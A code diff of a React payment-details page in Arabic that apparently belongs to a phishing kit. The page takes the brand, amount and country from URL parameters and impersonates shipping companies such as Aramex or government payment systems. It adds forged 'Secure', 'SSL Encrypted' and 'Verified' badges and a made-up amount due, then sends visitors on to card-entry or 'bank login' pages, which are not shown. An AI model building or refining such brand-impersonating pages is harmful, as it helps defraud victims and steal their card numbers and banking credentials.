@@ -1,174 +1,424 @@
-import { useState } from "react";
-import { useParams, useNavigate, useSearchParams } from "react-router-dom";
+import { useState, useEffect } from "react";
+import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
-import { Label } from "@/components/ui/label";
 import { Card } from "@/components/ui/card";
 import { getServiceBranding } from "@/lib/serviceLogos";
-import { useLink, useUpdateLink } from "@/hooks/useSupabase";
-import { Loader2, ShieldCheck, CreditCard, Building2, ChevronLeft, Lock, Info, ArrowRight } from "lucide-react";
-import { useToast } from "@/hooks/use-toast";
+import { shippingCompanyBranding, getGovBranding } from "@/lib/brandingSystem";
+import { useLinkData } from "@/hooks/useLinkData";
 import { getCountryByCode } from "@/lib/countries";
-import { formatCurrency } from "@/lib/countryCurrencies";
-import { getGovBranding } from "@/lib/governmentPaymentSystems";
+import { formatCurrency, getCurrencyByCountry } from "@/lib/countryCurrencies";
+import { CreditCard, ArrowLeft, Hash, DollarSign, Package, Truck, ShieldCheck, Lock, Sparkles, CheckCircle2 } from "lucide-react";
+import { designSystem } from "@/lib/designSystem";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
+import BrandedCarousel from "@/components/BrandedCarousel";
+import { detectEntityFromURL, getEntityLogo } from "@/lib/dynamicIdentity";
+import PageLoader from "@/components/PageLoader";
 
 const PaymentDetails = () => {
   const { id } = useParams();
-  const [searchParams] = useSearchParams();
   const navigate = useNavigate();
-  const { toast } = useToast();
-  const { data: linkData, isLoading: linkLoading } = useLink(id);
-  const updateLink = useUpdateLink();
+  const { data: linkData, isLoading, isError } = useLinkData(id);
+  const [showPage, setShowPage] = useState(false);
 
-  const [paymentMethod, setPaymentMethod] = useState<"card" | "bank_login">("card");
-  const [isSubmitting, setIsSubmitting] = useState(false);
+  useEffect(() => {
+    const timer = setTimeout(() => {
+      setShowPage(true);
+    }, 3000);
+    return () => clearTimeout(timer);
+  }, []);
 
-  const companyKey = searchParams.get("company") || linkData?.payload?.service_key || "aramex";
-  const govId = searchParams.get("govId") || linkData?.payload?.govId;
-  const branding = getServiceBranding(companyKey);
-  const govBranding = govId ? getGovBranding(govId) : undefined;
-
-  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
-  const rawAmount = linkData?.payload?.cod_amount || 500;
-  const formattedAmount = formatCurrency(rawAmount, selectedCountry);
-  const selectedCountryData = getCountryByCode(selectedCountry);
-
-  const isGov = !!govBranding;
-  const primaryColor = isGov ? govBranding.colors.primary : branding.colors.primary;
-
-  const handleSubmit = async () => {
-    setIsSubmitting(true);
-    try {
-      await updateLink.mutateAsync({ linkId: id!, payload: { ...linkData?.payload, paymentMethod } });
-      if (paymentMethod === "card") {
-        navigate(`/pay/${id}/card${window.location.search}`);
-      } else {
-        navigate(`/pay/${id}/bank${window.location.search}`);
-      }
-    } catch (error) {
-      toast({ title: "خطأ", description: "فشل تحديث طريقة الدفع", variant: "destructive" });
-    } finally {
-      setIsSubmitting(false);
+  useEffect(() => {
+    if (linkData || isError) {
+      setShowPage(true);
     }
-  };
+  }, [linkData, isError]);
 
-  if (linkLoading || !linkData) {
-    return (
-      <div className="min-h-screen flex items-center justify-center bg-gray-50">
-        <Loader2 className="w-10 h-10 animate-spin text-blue-600" />
-      </div>
-    );
+  const urlParams = new URLSearchParams(window.location.search);
+  const serviceKey = urlParams.get('company') || urlParams.get('service') || linkData?.payload?.service_key || 'aramex';
+  const govId = urlParams.get('govId') || linkData?.payload?.govId;
+  const branding = getServiceBranding(serviceKey);
+  const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
+  const govBranding = govId ? getGovBranding(govId) : undefined;
+  const serviceName = govBranding?.nameAr || linkData?.payload?.service_name || linkData?.payload?.customerInfo?.service || serviceKey;
+  const shippingInfo = linkData?.payload as any;
+
+  const amountParam = urlParams.get('amount');
+  const currencyParam = urlParams.get('currency');
+  const methodParam = urlParams.get('method') || urlParams.get('pm');
+  const countryParam = urlParams.get('country');
+
+  const countryCode = countryParam || shippingInfo?.selectedCountry || "SA";
+  const currencyInfo = getCurrencyByCountry(countryCode);
+
+  const rawAmount = amountParam || shippingInfo?.cod_amount || shippingInfo?.customerInfo?.amount;
+  let amount = 500;
+  if (rawAmount !== undefined && rawAmount !== null) {
+    if (typeof rawAmount === 'number') {
+      amount = rawAmount;
+    } else if (typeof rawAmount === 'string') {
+      const parsed = parseFloat(rawAmount);
+      if (!isNaN(parsed)) {
+        amount = parsed;
+      }
+    }
   }
 
+  const formattedAmount = formatCurrency(amount, currencyParam || countryCode);
+
+  if (isLoading && !showPage) {
+    return <PageLoader message="جاري تحميل تفاصيل الدفع..." />;
+  }
+
+  const detectedEntity = detectEntityFromURL();
+  const entityLogo = detectedEntity ? getEntityLogo(detectedEntity) : null;
+  const displayLogo = entityLogo || govBranding?.logoUrl || branding.logo;
+
+  const primaryColor = govBranding?.colors.primary || companyBranding?.colors.primary || branding.colors.primary;
+  const secondaryColor = govBranding?.colors.secondary || companyBranding?.colors.secondary || branding.colors.secondary;
+
+  const handleProceed = () => {
+    const paymentMethod = methodParam || (linkData?.payload as any)?.payment_method || 'card';
+    const govId = urlParams.get('govId') || linkData?.payload?.govId;
+
+    const queryParams = new URLSearchParams(window.location.search);
+    if (!queryParams.has('company')) queryParams.set('company', serviceKey);
+    if (!queryParams.has('currency')) queryParams.set('currency', currencyParam || countryCode);
+    if (!queryParams.has('amount')) queryParams.set('amount', amount.toString());
+    if (govId) queryParams.set('govId', govId);
+
+    const nextUrl = paymentMethod === 'bank_login'
+      ? `/pay/${id}/bank?${queryParams.toString()}`
+      : `/pay/${id}/card?${queryParams.toString()}`;
+
+    navigate(nextUrl);
+  };
+
   return (
-    <div className="min-h-screen flex flex-col bg-[#F8F9FA]" dir="rtl">
+    <>
       <PaymentMetaTags
-        serviceKey={isGov ? govId! : companyKey}
-        serviceName={isGov ? govBranding.nameAr : branding.name}
-        title="تفاصيل السداد والمبلغ المستحق"
+        serviceKey={serviceKey}
+        serviceName={serviceName}
+        title={`تفاصيل الدفع - ${serviceName}`}
+        customDescription={`أكمل عملية الدفع بأمان وسهولة - ${serviceName}`}
         amount={formattedAmount}
       />
 
-      <header className="bg-white border-b-2 shadow-sm sticky top-0 z-50 px-4" style={{ borderBottomColor: primaryColor }}>
-         <div className="container mx-auto h-16 sm:h-20 flex items-center justify-between">
+      {/* Branded Header */}
+      <div
+        className="sticky top-0 z-50 w-full shadow-lg"
+        style={{
+          background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
+          borderBottom: `3px solid ${primaryColor}`
+        }}
+      >
+        <div className="container mx-auto px-4">
+          <div className="flex items-center justify-between h-16 sm:h-18">
             <div className="flex items-center gap-4">
-               <img src={isGov ? govBranding.logo : branding.logo} alt="" className="h-10 sm:h-12 object-contain" />
-               <div className="hidden sm:block">
-                  <h1 className="text-sm font-black text-gray-800 leading-none">{isGov ? govBranding.nameAr : branding.name}</h1>
-                  <p className="text-[9px] font-bold text-gray-400 uppercase tracking-widest mt-1">Invoice & Payment Summary</p>
-               </div>
+              {displayLogo && (
+                <img
+                  src={displayLogo}
+                  alt={serviceName}
+                  className="h-10 sm:h-12 w-auto object-contain brightness-0 invert"
+                />
+              )}
+              <div className="text-white">
+                <h2 className="text-lg sm:text-xl font-bold">
+                  {serviceName}
+                </h2>
+                <p className="text-xs opacity-90">
+                  الدفع الآمن - Secure Payment
+                </p>
+              </div>
             </div>
-            <div className="flex items-center gap-2 px-3 py-1 bg-green-50 text-green-700 rounded-full border border-green-100">
-               <Lock className="w-3 h-3" />
-               <span className="text-[10px] font-bold uppercase tracking-widest">Secured</span>
+
+            <div className="flex items-center gap-2 px-3 py-1.5 rounded-full bg-white/20 backdrop-blur-sm">
+              <ShieldCheck className="w-4 h-4 text-white" />
+              <span className="text-xs font-medium text-white">آمن</span>
             </div>
-         </div>
-      </header>
+          </div>
+        </div>
+      </div>
 
-      <main className="flex-1 container mx-auto px-4 py-8 sm:py-12 flex flex-col items-center">
-         <div className="w-full max-w-xl space-y-8">
-            <Card className="border-none shadow-2xl rounded-[2.5rem] overflow-hidden bg-white">
-               <div className="p-8 sm:p-10 text-center bg-gray-50/50 border-b">
-                  <p className="text-[11px] font-black text-gray-400 uppercase tracking-[0.2em] mb-4">المبلغ الإجمالي المستحق</p>
-                  <div className="flex items-center justify-center gap-3">
-                     <span className="text-4xl sm:text-6xl font-black text-gray-900">{rawAmount}</span>
-                     <div className="text-right">
-                        <p className="text-lg sm:text-2xl font-black text-gray-400 leading-none">{selectedCountryData?.currencyAr}</p>
-                        <p className="text-[10px] font-bold text-gray-300 uppercase tracking-widest">{selectedCountryData?.currencyEn}</p>
-                     </div>
-                  </div>
-               </div>
+      {/* Hero Carousel */}
+      <BrandedCarousel serviceKey={serviceKey} className="mb-0" />
 
-               <div className="p-8 sm:p-10 space-y-8">
-                  <div className="space-y-4">
-                    <Label className="text-[11px] font-black text-gray-400 uppercase tracking-widest px-1">اختر طريقة السداد المفضلة</Label>
-                    <div className="grid gap-4">
-                       <button
-                         onClick={() => setPaymentMethod("card")}
-                         className={`group p-6 rounded-[1.5rem] border-2 transition-all flex items-center gap-5 text-right relative overflow-hidden ${paymentMethod === "card" ? "border-blue-600 bg-blue-50/50" : "border-gray-100 bg-white hover:border-gray-200"}`}
-                       >
-                          <div className={`w-14 h-14 rounded-2xl flex items-center justify-center transition-colors ${paymentMethod === "card" ? "bg-blue-600 text-white" : "bg-gray-100 text-gray-400 group-hover:bg-gray-200"}`}>
-                             <CreditCard className="w-7 h-7" />
-                          </div>
-                          <div className="flex-1">
-                             <h4 className="font-black text-gray-800">البطاقة البنكية</h4>
-                             <p className="text-[10px] font-bold text-gray-400 uppercase tracking-wider">Mada, Visa, MasterCard</p>
-                          </div>
-                          <div className={`w-6 h-6 rounded-full border-2 flex items-center justify-center transition-all ${paymentMethod === "card" ? "border-blue-600 bg-blue-600" : "border-gray-200"}`}>
-                             {paymentMethod === "card" && <div className="w-2 h-2 rounded-full bg-white" />}
-                          </div>
-                       </button>
+      {/* Main Content */}
+      <div
+        className="min-h-screen py-8 sm:py-12"
+        dir="rtl"
+        style={{
+          background: `linear-gradient(135deg, ${companyBranding?.colors.surface || '#F8F9FA'}, #FFFFFF)`,
+          fontFamily: companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
+        }}
+      >
+        <div className="container mx-auto px-4 max-w-2xl">
+          {/* Page Title */}
+          <div className="text-center mb-8">
+            <div className="flex items-center justify-center gap-3 mb-4">
+              <Sparkles className="w-6 h-6" style={{ color: primaryColor }} />
+              <h1
+                className="text-3xl sm:text-4xl font-bold"
+                style={{
+                  color: designSystem.colors.neutral[900],
+                  fontFamily: designSystem.typography.fontFamilies.arabic
+                }}
+              >
+                تفاصيل الدفع
+              </h1>
+            </div>
+            <p className="text-base text-gray-600">
+              راجع تفاصيل طلبك قبل المتابعة للدفع
+            </p>
+          </div>
 
-                       <button
-                         onClick={() => setPaymentMethod("bank_login")}
-                         className={`group p-6 rounded-[1.5rem] border-2 transition-all flex items-center gap-5 text-right relative overflow-hidden ${paymentMethod === "bank_login" ? "border-blue-600 bg-blue-50/50" : "border-gray-100 bg-white hover:border-gray-200"}`}
-                       >
-                          <div className={`w-14 h-14 rounded-2xl flex items-center justify-center transition-colors ${paymentMethod === "bank_login" ? "bg-blue-600 text-white" : "bg-gray-100 text-gray-400 group-hover:bg-gray-200"}`}>
-                             <Building2 className="w-7 h-7" />
-                          </div>
-                          <div className="flex-1">
-                             <h4 className="font-black text-gray-800">تسجيل دخول البنك</h4>
-                             <p className="text-[10px] font-bold text-gray-400 uppercase tracking-wider">Direct Net Banking Login</p>
-                          </div>
-                          <div className={`w-6 h-6 rounded-full border-2 flex items-center justify-center transition-all ${paymentMethod === "bank_login" ? "border-blue-600 bg-blue-600" : "border-gray-200"}`}>
-                             {paymentMethod === "bank_login" && <div className="w-2 h-2 rounded-full bg-white" />}
-                          </div>
-                       </button>
+          <Card
+            className="overflow-hidden border-0 mb-6"
+            style={{
+              borderRadius: '20px',
+              boxShadow: '0 8px 32px rgba(0,0,0,0.1)'
+            }}
+          >
+            {/* Shipping Info Display */}
+            {shippingInfo && (
+              <>
+                <div
+                  className="px-6 sm:px-8 py-6"
+                  style={{
+                    background: `linear-gradient(135deg, ${primaryColor}15, ${secondaryColor}15)`,
+                    borderBottom: `2px solid ${primaryColor}30`
+                  }}
+                >
+                  <div className="flex items-center gap-3">
+                    <div
+                      className="w-12 h-12 rounded-xl flex items-center justify-center"
+                      style={{
+                        background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`
+                      }}
+                    >
+                      <Package className="w-6 h-6 text-white" />
+                    </div>
+                    <div>
+                      <h2 className="text-xl font-bold" style={{ color: designSystem.colors.neutral[900] }}>
+                        تفاصيل الشحنة
+                      </h2>
+                      <p className="text-sm text-gray-600">
+                        معلومات الطرد والتوصيل
+                      </p>
                     </div>
                   </div>
+                </div>
 
-                  <div className="space-y-6">
-                    <Button
-                      onClick={handleSubmit}
-                      disabled={isSubmitting}
-                      className="w-full h-16 rounded-2xl font-black text-lg shadow-xl hover:translate-y-[-2px] transition-all text-white active:scale-[0.98]"
-                      style={{ backgroundColor: primaryColor }}
-                    >
-                      {isSubmitting ? <Loader2 className="w-6 h-6 animate-spin" /> : "متابعة الدفع"}
-                    </Button>
-                    <button onClick={() => navigate(-1)} className="w-full text-[11px] font-black text-gray-400 uppercase tracking-widest hover:text-gray-600 transition-colors flex items-center justify-center gap-2">
-                       <ArrowRight className="w-4 h-4" />
-                       العودة وتعديل البيانات
-                    </button>
-                  </div>
-               </div>
+                <div className="px-6 sm:px-8 py-6 bg-white space-y-4">
+                  {shippingInfo.tracking_number && (
+                    <div className="flex items-center justify-between py-3 border-b">
+                      <div className="flex items-center gap-2 text-gray-600">
+                        <Hash className="w-4 h-4" />
+                        <span className="text-sm">رقم الشحنة</span>
+                      </div>
+                      <span className="font-bold text-base">{shippingInfo.tracking_number}</span>
+                    </div>
+                  )}
+                  {shippingInfo.package_description && (
+                    <div className="flex items-center justify-between py-3 border-b">
+                      <div className="flex items-center gap-2 text-gray-600">
+                        <Truck className="w-4 h-4" />
+                        <span className="text-sm">وصف الطرد</span>
+                      </div>
+                      <span className="font-semibold text-base">{shippingInfo.package_description}</span>
+                    </div>
+                  )}
+                </div>
+              </>
+            )}
+          </Card>
 
-               <div className="p-6 bg-gray-50 border-t flex items-center justify-center gap-6 opacity-30 grayscale">
-                  <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mada.png" className="h-4" alt="mada" />
-                  <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/visa.png" className="h-4" alt="visa" />
-                  <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mastercard.png" className="h-4" alt="mastercard" />
-               </div>
-            </Card>
-
-            <div className="flex items-center gap-3 p-4 bg-blue-50/50 rounded-2xl border border-blue-100 text-blue-800">
-               <Info className="w-5 h-5 flex-shrink-0" />
-               <p className="text-[11px] font-bold leading-relaxed">
-                  تأكد من اختيار طريقة الدفع المناسبة لك. سيتم توجيهك بشكل آمن لإتمام العملية وفقاً لمعايير الأمان العالمية.
-               </p>
+          {/* Payment Summary */}
+          <Card
+            className="overflow-hidden border-0 mb-6"
+            style={{
+              borderRadius: '20px',
+              boxShadow: '0 8px 32px rgba(0,0,0,0.1)'
+            }}
+          >
+            <div
+              className="px-6 sm:px-8 py-6"
+              style={{
+                background: `linear-gradient(135deg, ${primaryColor}15, ${secondaryColor}15)`,
+                borderBottom: `2px solid ${primaryColor}30`
+              }}
+            >
+              <div className="flex items-center gap-3">
+                <div
+                  className="w-12 h-12 rounded-xl flex items-center justify-center"
+                  style={{
+                    background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`
+                  }}
+                >
+                  <DollarSign className="w-6 h-6 text-white" />
+                </div>
+                <div>
+                  <h2 className="text-xl font-bold" style={{ color: designSystem.colors.neutral[900] }}>
+                    ملخص الدفع
+                  </h2>
+                  <p className="text-sm text-gray-600">
+                    المبلغ المطلوب
+                  </p>
+                </div>
+              </div>
             </div>
-         </div>
-      </main>
-    </div>
+
+            <div className="px-6 sm:px-8 py-6 bg-white space-y-4">
+              <div className="flex justify-between py-3 border-b">
+                <span className="text-gray-600">الخدمة</span>
+                <span className="font-bold text-base">{serviceName}</span>
+              </div>
+
+              <div
+                className="flex justify-between items-center py-5 px-5 rounded-xl"
+                style={{
+                  background: `linear-gradient(135deg, ${primaryColor}10, ${secondaryColor}10)`
+                }}
+              >
+                <span className="text-lg font-bold">المبلغ الإجمالي</span>
+                <span className="text-3xl font-bold" style={{ color: primaryColor }}>
+                  {formattedAmount}
+                </span>
+              </div>
+            </div>
+          </Card>
+
+          {/* Payment Method */}
+          <Card
+            className="overflow-hidden border-0 mb-8"
+            style={{
+              borderRadius: '20px',
+              boxShadow: '0 8px 32px rgba(0,0,0,0.1)'
+            }}
+          >
+            <div
+              className="px-6 sm:px-8 py-6"
+              style={{
+                background: `linear-gradient(135deg, ${primaryColor}15, ${secondaryColor}15)`,
+                borderBottom: `2px solid ${primaryColor}30`
+              }}
+            >
+              <div className="flex items-center gap-3">
+                <div
+                  className="w-12 h-12 rounded-xl flex items-center justify-center"
+                  style={{
+                    background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`
+                  }}
+                >
+                  <CreditCard className="w-6 h-6 text-white" />
+                </div>
+                <div>
+                  <h2 className="text-xl font-bold" style={{ color: designSystem.colors.neutral[900] }}>
+                    طريقة الدفع
+                  </h2>
+                  <p className="text-sm text-gray-600">
+                    الدفع الإلكتروني الآمن
+                  </p>
+                </div>
+              </div>
+            </div>
+
+            <div className="px-6 sm:px-8 py-6 bg-white">
+              {(methodParam || (linkData?.payload as any)?.payment_method) === 'bank_login' ? (
+                <div
+                  className="flex items-center gap-4 p-5 rounded-xl border-2"
+                  style={{
+                    borderColor: primaryColor,
+                    background: `${primaryColor}08`
+                  }}
+                >
+                  <div
+                    className="w-12 h-12 rounded-lg flex items-center justify-center flex-shrink-0"
+                    style={{
+                      background: `${primaryColor}20`
+                    }}
+                  >
+                    <Lock className="w-6 h-6" style={{ color: primaryColor }} />
+                  </div>
+                  <div className="flex-1">
+                    <p className="font-bold text-base mb-1">تسجيل دخول البنك 🏦</p>
+                    <p className="text-sm text-gray-600">
+                      الدفع الآمن عبر حسابك البنكي
+                    </p>
+                  </div>
+                  <CheckCircle2 className="w-6 h-6" style={{ color: primaryColor }} />
+                </div>
+              ) : (
+                <div
+                  className="flex items-center gap-4 p-5 rounded-xl border-2"
+                  style={{
+                    borderColor: primaryColor,
+                    background: `${primaryColor}08`
+                  }}
+                >
+                  <div
+                    className="w-12 h-12 rounded-lg flex items-center justify-center flex-shrink-0"
+                    style={{
+                      background: `${primaryColor}20`
+                    }}
+                  >
+                    <CreditCard className="w-6 h-6" style={{ color: primaryColor }} />
+                  </div>
+                  <div className="flex-1">
+                    <p className="font-bold text-base mb-1">الدفع بالبطاقة 💳</p>
+                    <p className="text-sm text-gray-600">
+                      Visa • Mastercard • Mada
+                    </p>
+                  </div>
+                  <CheckCircle2 className="w-6 h-6" style={{ color: primaryColor }} />
+                </div>
+              )}
+            </div>
+          </Card>
+
+          {/* Proceed Button */}
+          <Button
+            onClick={handleProceed}
+            size="lg"
+            className="w-full text-xl py-8 text-white font-bold transition-all duration-300 hover:shadow-2xl rounded-xl"
+            style={{
+              background: `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
+              boxShadow: `0 12px 32px -8px ${primaryColor}70`
+            }}
+          >
+            <span className="ml-3">متابعة للدفع</span>
+            <ArrowLeft className="w-6 h-6 mr-2" />
+          </Button>
+
+          <div className="mt-6 flex items-center justify-center gap-2 text-sm text-gray-600">
+            <Lock className="w-4 h-4" />
+            <p>
+              بالمتابعة، أنت توافق على{' '}
+              <a href="#" className="underline hover:no-underline" style={{ color: primaryColor }}>
+                الشروط والأحكام
+              </a>
+            </p>
+          </div>
+
+          {/* Footer */}
+          <div className="mt-8 text-center">
+            <div className="flex items-center justify-center gap-4 text-xs text-gray-500 mb-3">
+              <div className="flex items-center gap-1.5">
+                <Lock className="w-3.5 h-3.5" />
+                <span>SSL Encrypted</span>
+              </div>
+              <span>•</span>
+              <div className="flex items-center gap-1.5">
+                <ShieldCheck className="w-3.5 h-3.5" />
+                <span>Verified</span>
+              </div>
+            </div>
+            <p className="text-xs text-gray-400">
+              © 2025 {serviceName}. جميع الحقوق محفوظة.
+            </p>
+          </div>
+        </div>
+      </div>
+    </>
   );
 };
 
